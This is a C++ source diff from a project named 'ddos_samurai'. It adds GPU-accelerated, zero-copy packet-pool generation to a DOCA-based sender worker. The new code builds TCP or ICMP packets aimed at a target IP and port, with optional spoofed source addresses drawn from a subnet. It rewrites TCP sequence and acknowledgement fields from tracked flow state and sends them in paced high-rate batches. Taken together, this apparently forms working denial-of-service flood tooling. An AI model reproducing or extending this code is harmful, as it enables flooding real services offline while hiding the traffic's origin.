@@ -250,26 +250,256 @@ std::string DefaultGpuContractExportSpec(
 using samurai::daemon::ConfigFromEnvelope;
 
 
-std::vector<std::string> CandidateDocaLibs() {
-  std::set<std::string> uniq;
+std::vector<std::string> CandidateDocaLibs(bool prefer_geforce_p2p = false) {
+  std::vector<std::string> out;
+  std::set<std::string> seen;
   auto add_if = [&](const char* v) {
-    if (v && *v) uniq.insert(std::string(v));
+    if (v && *v) {
+      std::string s(v);
+      if (seen.insert(s).second) {
+        out.push_back(std::move(s));
+      }
+    }
   };
   add_if(std::getenv("SAMURAI_DOCA_API_LIB"));
   add_if(std::getenv("SAMURAI_GPU_DOCA_API_LIB"));
   add_if(std::getenv("SAMURAI_GPU_DOCA_SHIM_SO"));
-  uniq.insert("libsamurai_doca_gpunetio_shim.so");
-  uniq.insert("ddos_samurai/libsamurai_doca_gpunetio_shim.so");
-  uniq.insert("libsamurai_doca_gpunetio_backend.so");
-  uniq.insert("ddos_samurai/libsamurai_doca_gpunetio_backend.so");
-  uniq.insert("ddos_samurai/libgpu_packet_cuda.so");
-  return std::vector<std::string>(uniq.begin(), uniq.end());
+  if (prefer_geforce_p2p) {
+    add_if("ddos_samurai/libgpu_packet_cuda.so");
+    add_if("libgpu_packet_cuda.so");
+  }
+  add_if("libsamurai_doca_gpunetio_shim.so");
+  add_if("ddos_samurai/libsamurai_doca_gpunetio_shim.so");
+  add_if("libsamurai_doca_gpunetio_backend.so");
+  add_if("ddos_samurai/libsamurai_doca_gpunetio_backend.so");
+  add_if("ddos_samurai/libgpu_packet_cuda.so");
+  add_if("libgpu_packet_cuda.so");
+  return out;
 }
 
-bool LoadDocaNative(DocaNativeBridge& out, std::string& err) {
+using fn_gpu_generate_packets_t = int (*)(
+    std::int64_t,
+    const char*,
+    std::int64_t,
+    const char*,
+    int,
+    const char*,
+    std::int64_t,
+    int,
+    std::int64_t,
+    std::uint64_t,
+    std::uint64_t,
+    const char*,
+    std::uint8_t**,
+    std::size_t*,
+    int*);
+using fn_gpu_generate_icmp_t = int (*)(
+    std::int64_t,
+    const char*,
+    const char*,
+    int,
+    int,
+    std::int64_t,
+    std::int64_t,
+    std::int64_t,
+    std::uint64_t,
+    std::uint64_t,
+    const char*,
+    std::uint8_t**,
+    std::size_t*,
+    int*);
+using fn_gpu_free_t = void (*)(void* ptr);
+using fn_gpu_p2p_get_arena_info_t = int (*)(
+    uint64_t* out_bar1_phys,
+    void** out_host_ptr,
+    void** out_dev_ptr,
+    size_t* out_size);
+
+struct DpuGpuBar1PacketPool {
+  void* dl_handle = nullptr;
+  bool owns_dl = false;
+  fn_gpu_free_t free_fn = nullptr;
+  uint8_t* data = nullptr;
+  size_t total_bytes = 0u;
+  size_t stride = 0u;
+  uint64_t bar1_phys_base = 0u;
+  void* bar1_host_ptr = nullptr;
+  void* bar1_dev_ptr = nullptr;
+  size_t bar1_arena_bytes = 0u;
+  bool active = false;
+
+  ~DpuGpuBar1PacketPool() {
+    if (data && free_fn) {
+      free_fn(data);
+      data = nullptr;
+    }
+    if (owns_dl && dl_handle) {
+      dlclose(dl_handle);
+      dl_handle = nullptr;
+    }
+  }
+};
+
+std::uint16_t TcpFlagsFromEnvelope(const samurai::wire::JobEnvelopeV1& env);
+
+bool TryGenerateDpuGpuBar1Pool(
+    const DocaNativeBridge& doca,
+    const samurai::wire::JobEnvelopeV1& env,
+    int count,
+    DpuGpuBar1PacketPool& out) {
+  void* h = nullptr;
+  bool owns = false;
+  if (doca.handle && dlsym(doca.handle, "samurai_gpu_packet_generate_packets") != nullptr) {
+    h = doca.handle;
+  } else {
+    const char* candidates[] = {
+        std::getenv("SAMURAI_GPU_NATIVE_LIB"),
+        "ddos_samurai/libgpu_packet_cuda.so",
+        "libgpu_packet_cuda.so",
+        "../ddos_samurai/libgpu_packet_cuda.so",
+    };
+    for (const char* cand : candidates) {
+      if (!cand || !*cand) continue;
+      h = dlopen(cand, RTLD_NOW | RTLD_LOCAL);
+      if (h) {
+        owns = true;
+        break;
+      }
+    }
+  }
+  if (!h) return false;
+
+  auto gen_fn = reinterpret_cast<fn_gpu_generate_packets_t>(dlsym(h, "samurai_gpu_packet_generate_packets"));
+  auto gen_icmp = reinterpret_cast<fn_gpu_generate_icmp_t>(dlsym(h, "samurai_gpu_packet_generate_icmp_packets"));
+  auto free_fn = reinterpret_cast<fn_gpu_free_t>(dlsym(h, "samurai_gpu_packet_free"));
+  auto arena_fn = reinterpret_cast<fn_gpu_p2p_get_arena_info_t>(dlsym(h, "samurai_gpu_packet_p2p_get_arena_info"));
+  if (!gen_fn || !gen_icmp || !free_fn || !arena_fn) {
+    if (owns) dlclose(h);
+    return false;
+  }
+
+  (void)setenv("SAMURAI_GPU_PACKET_BAR1_P2P_OUTPUT", "1", 1);
+  (void)setenv("SAMURAI_GPU_PACKET_ZEROCOPY_OUTPUT", "1", 1);
+
+  const std::string target_ip = ReadFixed(env.target_ip, sizeof(env.target_ip));
+  const std::string target_ip_norm = target_ip.empty() ? "127.0.0.1" : target_ip;
+  const std::string proto = ReadFixed(env.protocol, sizeof(env.protocol));
+  const std::string spoof_subnet = ReadFixed(env.spoof_subnet, sizeof(env.spoof_subnet));
+  const char* spoof_subnet_ptr = spoof_subnet.empty() ? "10.0.0.0/8" : spoof_subnet.c_str();
+  const int pool_packets = std::min(std::max(1, count), 65536);
+  const std::int64_t tcp_flags_mask = static_cast<std::int64_t>(TcpFlagsFromEnvelope(env));
+
+  uint8_t* pkt_buf = nullptr;
+  size_t pkt_total = 0u;
+  int pkt_stride = 0;
+  int rc = -1;
+  if (proto == "icmp" || proto == "ICMP") {
+    rc = gen_icmp(
+        pool_packets,
+        target_ip_norm.c_str(),
+        "192.168.1.100",
+        env.spoof_enabled != 0u ? 1 : 0,
+        1,
+        8,
+        0,
+        std::max<std::int64_t>(0, static_cast<std::int64_t>(env.packet_size) - 42),
+        0ull,
+        0xFFFFFFFFFFFFull,
+        spoof_subnet_ptr,
+        &pkt_buf,
+        &pkt_total,
+        &pkt_stride);
+  } else {
+    const std::string proto_norm = proto.empty() ? "tcp" : proto;
+    rc = gen_fn(
+        pool_packets,
+        target_ip_norm.c_str(),
+        static_cast<std::int64_t>(env.target_port != 0u ? env.target_port : 443u),
+        proto_norm.c_str(),
+        env.spoof_enabled != 0u ? 1 : 0,
+        "192.168.1.100",
+        tcp_flags_mask != 0 ? tcp_flags_mask : 2,
+        1,  // has_ethernet
+        env.window == 0ull ? -1 : static_cast<std::int64_t>(env.window),
+        0ull,
+        0xFFFFFFFFFFFFull,
+        spoof_subnet_ptr,
+        &pkt_buf,
+        &pkt_total,
+        &pkt_stride);
+  }
+  if (rc != 0 || !pkt_buf || pkt_total == 0u || pkt_stride <= 0) {
+    if (owns) dlclose(h);
+    return false;
+  }
+
+  uint64_t bar1_phys = 0u;
+  void* bar1_host = nullptr;
+  void* bar1_dev = nullptr;
+  size_t bar1_sz = 0u;
+  if (arena_fn(&bar1_phys, &bar1_host, &bar1_dev, &bar1_sz) != 0 || !bar1_host || bar1_sz == 0u) {
+    free_fn(pkt_buf);
+    if (owns) dlclose(h);
+    return false;
+  }
+
+  out.dl_handle = h;
+  out.owns_dl = owns;
+  out.free_fn = free_fn;
+  out.data = pkt_buf;
+  out.total_bytes = pkt_total;
+  out.stride = static_cast<size_t>(pkt_stride);
+  out.bar1_phys_base = bar1_phys;
+  out.bar1_host_ptr = bar1_host;
+  out.bar1_dev_ptr = bar1_dev;
+  out.bar1_arena_bytes = bar1_sz;
+  out.active = (pkt_buf >= static_cast<uint8_t*>(bar1_host) &&
+                pkt_buf < (static_cast<uint8_t*>(bar1_host) + bar1_sz));
+  return true;
+}
+
+inline void PatchBar1TcpPacketFromDpuState(
+    uint8_t* frame,
+    size_t frame_len,
+    const samurai::dpu::FlowState& flow_st,
+    uint32_t seq_override) {
+  if (!frame || frame_len < 54u || flow_st.proto != samurai::dpu::kProtoTcp) {
+    return;
+  }
+  const uint16_t eth_type = (static_cast<uint16_t>(frame[12]) << 8u) | static_cast<uint16_t>(frame[13]);
+  if (eth_type != 0x0800u) {
+    return;
+  }
+  const size_t ihl = static_cast<size_t>(frame[14] & 0x0Fu) * 4u;
+  if (ihl < 20u || 14u + ihl + 20u > frame_len || frame[23] != 6u) {
+    return;
+  }
+  uint8_t* tcp = frame + 14u + ihl;
+  if (flow_st.src_port != 0u) {
+    tcp[0] = static_cast<uint8_t>((flow_st.src_port >> 8u) & 0xFFu);
+    tcp[1] = static_cast<uint8_t>(flow_st.src_port & 0xFFu);
+  }
+  if (flow_st.dst_port != 0u) {
+    tcp[2] = static_cast<uint8_t>((flow_st.dst_port >> 8u) & 0xFFu);
+    tcp[3] = static_cast<uint8_t>(flow_st.dst_port & 0xFFu);
+  }
+  tcp[4] = static_cast<uint8_t>((seq_override >> 24u) & 0xFFu);
+  tcp[5] = static_cast<uint8_t>((seq_override >> 16u) & 0xFFu);
+  tcp[6] = static_cast<uint8_t>((seq_override >> 8u) & 0xFFu);
+  tcp[7] = static_cast<uint8_t>(seq_override & 0xFFu);
+  tcp[8] = static_cast<uint8_t>((flow_st.ack_num >> 24u) & 0xFFu);
+  tcp[9] = static_cast<uint8_t>((flow_st.ack_num >> 16u) & 0xFFu);
+  tcp[10] = static_cast<uint8_t>((flow_st.ack_num >> 8u) & 0xFFu);
+  tcp[11] = static_cast<uint8_t>(flow_st.ack_num & 0xFFu);
+  if (flow_st.flags != 0u) {
+    tcp[13] = static_cast<uint8_t>(flow_st.flags & 0xFFu);
+  }
+}
+
+bool LoadDocaNative(DocaNativeBridge& out, std::string& err, bool prefer_geforce_p2p = false) {
   if (out.handle && out.api.create_txq) return true;
 
-  for (const std::string& cand : CandidateDocaLibs()) {
+  for (const std::string& cand : CandidateDocaLibs(prefer_geforce_p2p)) {
     void* h = dlopen(cand.c_str(), RTLD_NOW | RTLD_LOCAL);
     if (!h) continue;
 
@@ -950,7 +1180,12 @@ std::vector<std::uint8_t> JsonDone(
     std::uint64_t bytes_sent,
     double actual_rps,
     double rate_accuracy_pct,
-    int queue_id) {
+    int queue_id,
+    bool bar1_zero_copy = false,
+    std::uint64_t bar1_phys_base = 0u) {
+  const std::string note = bar1_zero_copy
+      ? "dpu_stateful_l4+geforce_bar1_p2p_zero_copy+pacing_static"
+      : "doca_gpunetio_native+cpu_native+pacing_static";
   const std::string json =
       "{\"status\":\"ok\",\"worker_kind\":\"doca\",\"correlation_id\":" +
       std::to_string(correlation_id) +
@@ -961,7 +1196,9 @@ std::vector<std::uint8_t> JsonDone(
       ",\"actual_rps\":" + std::to_string(actual_rps) +
       ",\"rate_accuracy_pct\":" + std::to_string(rate_accuracy_pct) +
       ",\"doca_queue_id\":" + std::to_string(queue_id) +
-      ",\"note\":\"doca_gpunetio_native+cpu_native+pacing_static\"}";
+      ",\"bar1_zero_copy\":" + std::string(bar1_zero_copy ? "true" : "false") +
+      ",\"bar1_phys_base\":" + std::to_string(bar1_phys_base) +
+      ",\"note\":\"" + note + "\"}";
   return std::vector<std::uint8_t>(json.begin(), json.end());
 }
 
@@ -981,6 +1218,8 @@ int main(int argc, char** argv) {
   bool bind_events = false;
   bool dpu_state_publish = true;
   bool dpu_contract_rdma = false;
+  bool geforce_p2p = EnvBool("SAMURAI_DPU_GEFORCE_P2P", false) ||
+                     EnvBool("SAMURAI_GPU_PACKET_BAR1_P2P_OUTPUT", false);
   bool dpu_tcp_rx_feedback = EnvBool("SAMURAI_DPU_TCP_RX_FEEDBACK", false);
   bool dpu_tcp_passive_open = EnvBool("SAMURAI_DPU_TCP_PASSIVE_OPEN", false);
   int cli_queue_id = -1;
@@ -1023,6 +1262,8 @@ int main(int argc, char** argv) {
       dpu_state_publish = !(value == "0" || value == "off" || value == "false");
     } else if (arg == "--dpu-contract-rdma") {
       dpu_contract_rdma = true;
+    } else if (arg == "--geforce-p2p" || arg == "--gpu-bar1-p2p") {
+      geforce_p2p = true;
     } else if (arg == "--dpu-contract-rdma-spec" && i + 1 < argc) {
       cli_contract_rdma_spec = argv[++i];
     } else if (arg == "--dpu-tcp-rx-feedback") {
@@ -1094,6 +1335,10 @@ int main(int argc, char** argv) {
   }
 
   (void)setenv("SAMURAI_GPU_DOCA_ENABLE", "1", 0);
+  if (geforce_p2p) {
+    (void)setenv("SAMURAI_DPU_GEFORCE_P2P", "1", 1);
+    (void)setenv("SAMURAI_GPU_PACKET_BAR1_P2P_OUTPUT", "1", 1);
+  }
 
   DocaNativeBridge doca{};
   samurai::dpu::FlowStateTable dpu_state{};
@@ -1166,7 +1411,7 @@ int main(int argc, char** argv) {
 
       try {
         std::string load_err;
-        if (!LoadDocaNative(doca, load_err)) {
+        if (!LoadDocaNative(doca, load_err, geforce_p2p)) {
           (void)SendFrame(push,
                           static_cast<std::uint8_t>(samurai::wire::MessageType::ERROR),
                           header.correlation_id,
@@ -1180,7 +1425,10 @@ int main(int argc, char** argv) {
         const std::string iface_env =
             (std::getenv("SAMURAI_GPU_DOCA_IFACE") ? std::getenv("SAMURAI_GPU_DOCA_IFACE")
                                                    : (std::getenv("SAMURAI_XDP_IFACE") ? std::getenv("SAMURAI_XDP_IFACE") : ""));
-        const std::string iface = !cli_iface.empty() ? cli_iface : (!iface_wire.empty() ? iface_wire : iface_env);
+        std::string iface = !cli_iface.empty() ? cli_iface : (!iface_wire.empty() ? iface_wire : iface_env);
+        if (iface.empty() && geforce_p2p) {
+          iface = "lo";
+        }
         if (iface.empty()) {
           (void)SendFrame(push,
                           static_cast<std::uint8_t>(samurai::wire::MessageType::ERROR),
@@ -1192,7 +1440,10 @@ int main(int argc, char** argv) {
         }
 
         const std::string dev_env = (std::getenv("SAMURAI_GPU_DOCA_DEVICE") ? std::getenv("SAMURAI_GPU_DOCA_DEVICE") : "");
-        const std::string device = !cli_device.empty() ? cli_device : dev_env;
+        std::string device = !cli_device.empty() ? cli_device : dev_env;
+        if (device.empty() && geforce_p2p) {
+          device = "geforce_bar1_p2p";
+        }
         if (device.empty()) {
           (void)SendFrame(push,
                           static_cast<std::uint8_t>(samurai::wire::MessageType::ERROR),
@@ -1259,11 +1510,22 @@ int main(int argc, char** argv) {
 
         PacketConfig cfg = ConfigFromEnvelope(env);
         ddos_samurai::cpu_native::PacketPoolBuffer pool{};
+        DpuGpuBar1PacketPool bar1_pool{};
+        const uint8_t* pool_base = nullptr;
+        std::size_t pool_total_bytes = 0u;
         std::size_t stride = 0u;
         if (!passive_job) {
-          pool = ddos_samurai::cpu_native::generate_packet_pool_view(cfg, packet_count, true, true);
-          stride = pool.packet_size;
-          if (stride == 0 || pool.size() < stride) {
+          if (geforce_p2p && TryGenerateDpuGpuBar1Pool(doca, env, packet_count, bar1_pool)) {
+            pool_base = bar1_pool.data;
+            pool_total_bytes = bar1_pool.total_bytes;
+            stride = bar1_pool.stride;
+          } else {
+            pool = ddos_samurai::cpu_native::generate_packet_pool_view(cfg, packet_count, true, true);
+            pool_base = pool.data();
+            pool_total_bytes = pool.size();
+            stride = pool.packet_size;
+          }
+          if (stride == 0 || !pool_base || pool_total_bytes < stride) {
             (void)SendFrame(push,
                             static_cast<std::uint8_t>(samurai::wire::MessageType::ERROR),
                             header.correlation_id,
@@ -1301,7 +1563,7 @@ int main(int argc, char** argv) {
             continue;
           }
         } else {
-          initial_flow = dpu_state.Upsert(InitialFlowStateFromWirePacket(header, env, pool.data(), stride));
+          initial_flow = dpu_state.Upsert(InitialFlowStateFromWirePacket(header, env, pool_base, stride));
         }
         const std::uint64_t initial_publish_ns = samurai_pacing_monotonic_now_ns();
         if (dpu_state_publish) {
@@ -1350,17 +1612,27 @@ int main(int argc, char** argv) {
         DpuTcpRxScratch rx_scratch{};
 
         int offset = 0;
+        const std::uint32_t seq_advance_per_pkt = TcpSequenceAdvanceFromEnvelope(env);
         while (offset < packet_count) {
           const int n_this = std::min(batch_size, packet_count - offset);
+          const samurai::dpu::FlowState* cur_flow = dpu_state.Find(initial_flow.flow_id);
+          const samurai::dpu::FlowState active_flow = cur_flow ? *cur_flow : initial_flow;
           for (int i = 0; i < n_this; ++i) {
             samurai_pacing_wait_next(&pace_state, &pace_cfg);
             const std::size_t off = static_cast<std::size_t>(offset + i) * stride;
-            if (off + stride > pool.size()) {
+            if (off + stride > pool_total_bytes) {
               ptrs[static_cast<std::size_t>(i)] = nullptr;
               lens[static_cast<std::size_t>(i)] = 0u;
               continue;
             }
-            ptrs[static_cast<std::size_t>(i)] = pool.data() + off;
+            if (bar1_pool.active && bar1_pool.data) {
+              const std::uint32_t pkt_seq = static_cast<std::uint32_t>(
+                  (static_cast<std::uint64_t>(initial_flow.seq_num) +
+                   static_cast<std::uint64_t>(offset + i) * seq_advance_per_pkt) &
+                  0xFFFFFFFFull);
+              PatchBar1TcpPacketFromDpuState(bar1_pool.data + off, stride, active_flow, pkt_seq);
+            }
+            ptrs[static_cast<std::size_t>(i)] = pool_base + off;
             lens[static_cast<std::size_t>(i)] = static_cast<uint16_t>(std::min<std::size_t>(stride, 65535u));
           }
 
@@ -1597,7 +1869,9 @@ int main(int argc, char** argv) {
                                                         bytes_sent,
                                                         snap.actual_rps,
                                                         snap.rate_accuracy_pct,
-                                                        queue_id);
+                                                        queue_id,
+                                                        bar1_pool.active,
+                                                        bar1_pool.bar1_phys_base);
         (void)SendFrame(push,
                         static_cast<std::uint8_t>(samurai::wire::MessageType::JOB_DONE),
                         header.correlation_id,
